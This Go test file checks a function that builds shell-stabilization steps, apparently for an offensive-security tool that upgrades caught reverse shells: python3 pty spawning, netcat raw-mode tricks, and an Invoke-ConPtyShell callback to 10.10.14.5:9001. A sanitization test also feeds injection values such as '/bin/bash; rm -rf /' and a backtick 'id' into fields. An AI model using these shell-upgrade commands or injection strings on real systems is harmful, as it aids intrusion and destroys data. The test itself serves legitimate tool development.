package core

import (
	"strings"
	"testing"
)

func TestShellStabilize_BuildSteps_F34(t *testing.T) {
	// 1. Validation: missing sessionId
	_, err := BuildShellStabilizeSteps(ShellStabilizeRequest{})
	if err == nil {
		t.Fatal("expected error for empty sessionId")
	}

	// 2. Direct Python3 mode
	steps, err := BuildShellStabilizeSteps(ShellStabilizeRequest{
		SessionID: "sess-raw-1",
		Method:    StabilizeMethodPython3,
		Mode:      StabilizeModeDirect,
		ShellPath: "/bin/bash",
		Term:      "xterm-256color",
		Cols:      132,
		Rows:      40,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(steps) != 2 {
		t.Fatalf("expected 2 steps for direct mode, got %d", len(steps))
	}
	if !strings.Contains(steps[0].Data, `python3 -c 'import pty; pty.spawn("/bin/bash")'`) {
		t.Errorf("unexpected step 0 command: %q", steps[0].Data)
	}
	if !strings.Contains(steps[1].Data, "export TERM=xterm-256color SHELL=/bin/bash; stty rows 40 cols 132") {
		t.Errorf("unexpected step 1 resize command: %q", steps[1].Data)
	}

	// 3. Nested Netcat mode (Ctrl+Z, stty raw -echo; fg, stty rows/cols)
	stepsNc, err := BuildShellStabilizeSteps(ShellStabilizeRequest{
		SessionID: "sess-ssh-1",
		Method:    StabilizeMethodScript,
		Mode:      StabilizeModeNestedNc,
		ShellPath: "/bin/sh",
		Cols:      100,
		Rows:      30,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(stepsNc) != 5 {
		t.Fatalf("expected 5 steps for nested_nc mode, got %d", len(stepsNc))
	}
	if !strings.Contains(stepsNc[0].Data, "script -qc /bin/sh /dev/null") {
		t.Errorf("unexpected script step: %q", stepsNc[0].Data)
	}
	if stepsNc[1].Data != "\x1a" {
		t.Errorf("expected Ctrl+Z in step 1, got %q", stepsNc[1].Data)
	}
	if !strings.Contains(stepsNc[2].Data, "stty raw -echo; fg") {
		t.Errorf("expected stty raw -echo; fg in step 2, got %q", stepsNc[2].Data)
	}
	if !strings.Contains(stepsNc[4].Data, "stty rows 30 cols 100") {
		t.Errorf("expected stty rows 30 cols 100 in step 4, got %q", stepsNc[4].Data)
	}

	// 4. Windows ConPtyShell mode
	stepsWin, err := BuildShellStabilizeSteps(ShellStabilizeRequest{
		SessionID: "sess-win-1",
		Method:    StabilizeMethodConPtyShell,
		Mode:      StabilizeModeWindowsConPty,
		LHost:     "10.10.14.5",
		LPort:     9001,
		Cols:      120,
		Rows:      35,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(stepsWin) != 1 {
		t.Fatalf("expected 1 step for conptyshell, got %d", len(stepsWin))
	}
	if !strings.Contains(stepsWin[0].Data, "Invoke-ConPtyShell 10.10.14.5 9001 -Rows 35 -Cols 120") {
		t.Errorf("unexpected ConPtyShell command: %q", stepsWin[0].Data)
	}

	// 5. Sanitization check (injection characters stripped)
	stepsSan, err := BuildShellStabilizeSteps(ShellStabilizeRequest{
		SessionID: "sess-1",
		Method:    StabilizeMethodPython3,
		Mode:      StabilizeModeDirect,
		ShellPath: "/bin/bash; rm -rf /",
		Term:      "xterm`id`",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(stepsSan[0].Data, "rm -rf") || strings.Contains(stepsSan[1].Data, "`") {
		t.Errorf("sanitization failed: %q / %q", stepsSan[0].Data, stepsSan[1].Data)
	}
}

func TestShellStabilize_Presets_F34(t *testing.T) {
	presets := DefaultShellStabilizePresets()
	if len(presets) < 5 {
		t.Fatalf("expected at least 5 presets, got %d", len(presets))
	}
}
